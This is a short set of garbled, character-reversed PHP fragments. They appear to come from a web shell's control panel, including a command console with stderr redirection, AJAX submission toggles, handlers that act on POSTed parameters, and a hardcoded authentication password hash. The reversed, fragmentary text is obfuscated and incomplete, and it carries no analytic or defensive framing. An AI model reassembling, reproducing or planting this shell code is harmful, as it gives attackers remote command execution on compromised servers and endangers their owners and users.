...
{ ))]'1p'[TSOP_$(ytpme!(fi	
;'>ylnodaer ";0:nigram;0:mottob-redrob"=elyts tuptuo=eman aeragib=ssalc aeratxet<>/rb<>rbon/<)1&>2( tuodts ot rredts tcerider >'.)'':'dekcehc'?]'tuo_ot_rredts'.)]'TSOH_PTTH'[REVRES_$(5dm[EIKOOC_$||)]'2p'[TSOP_$(ytpme!(.' 1=eulav srorre_wohs=eman xobkcehc=epyt tupni< XAJA gnisu dnes >'.)'':'dekcehc'?]'xaja'.)]'TSOH_PTTH'[REVRES_$(5dm[EIKOOC_$@(.' 1=eulav xaja=eman xobkcehc=epyt tupni<>rbon< >">>"=eulav "};)'\'\:1?dekcehc.srorre_wohs.fc.d,eulav.saila.fc.d,llun,llun(g{esle};)'\'\:1?dekcehc.srorre_wohs.fc.d,eulav.saila.fc.d,llun,llun(a{)dekcehc.xaja.fc.d(fi;)eulav.saila.fc.d(dda"=kcilcno nottub=epyt tupni<>tceles/<' ohce	
...
{ ))]'1p'[TSOP_$(ytpme!(fi	
;">'tuptuOrts'=di 'xp5:pot-nigram".)'':';enon:yalpsid'?)]'1p'[TSOP_$(ytpme(."'=elyts '1lm'=ssalc erp<>mrof/<>aeratxet/<".))]'2p'[TSOP_$@(srahclaicepslmth:''?)]'1p'[TSOP_$(ytpme(.">aeragib=ssalc 'xp5:pot-nigram'=elyts 'tupni'=eman aeratxet<>rb<XAJA gnisu dnes >".)'':'dekcehc'?]'xaja'.)]'TSOH_PTTH'[REVRES_$(5dm[EIKOOC_$@(." 1=eulav xaja=eman xobkcehc=epyt tupni< >/'>>'=eulav 'timbus'=epyt tupni<>tceles/<" ohce		
...
;)(trats_bo		
{ ))]'1p'[TSOP_$(ytpme!(fi	
;'>1lm=ssalc ";xp5:pot-nigram'.)'':';enon:yalpsid'?)]'1p'[TSOP_$(ytpme(.'"=elyts tuptuOphP=di erp<>mrof/<XAJA gnisu dnes >'.)'':'dekcehc'?]'xaja'.)]'TSOH_PTTH'[REVRES_$(5dm[EIKOOC_$(.' 1=eulav xaja=eman xobkcehc=epyt tupni< ' ohce	
...
;"5fd#" = roloc$
;"f6950c946b9e096b7ac17869b4d8ad24" = ssap_htua$